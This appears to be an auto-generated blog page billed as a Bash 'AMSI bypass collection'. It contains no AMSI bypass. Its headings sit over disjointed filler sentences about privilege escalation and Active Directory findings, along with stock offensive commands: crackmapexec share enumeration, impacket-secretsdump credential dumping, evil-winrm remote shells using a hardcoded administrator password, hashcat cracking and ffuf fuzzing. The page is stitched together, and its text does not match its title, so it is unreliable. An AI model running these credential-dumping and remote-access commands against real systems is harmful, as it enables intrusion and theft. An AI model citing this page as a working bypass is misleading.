---
TitleSEO: "AMSI Bypass Collection in Bash | ZureFX"
TitlePost: "AMSI Bypass Collection — Bash"
Author: "ZureFX"
Description: "A Bash script for amsi bypass collection. Built for security research and automation."
Keywords: "python, tool, go, bash"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-196.html"
URL_IMAGES: ""
Date: "2026-01-04"
Tags: "Python, Tool, Go, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-196"
Permalink: "/scripting/script-amsi-bypass-collection-196.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `chisel`
- `evil-winrm`
- `wmiexec`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
crackmapexec smb 10.124.144.119 -u administrator -p 'P@ssw0rd!' --shares
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.39.58
feroxbuster -h
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.213.218/FUZZ
evil-winrm -i 10.103.36.26 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 11.96s
```
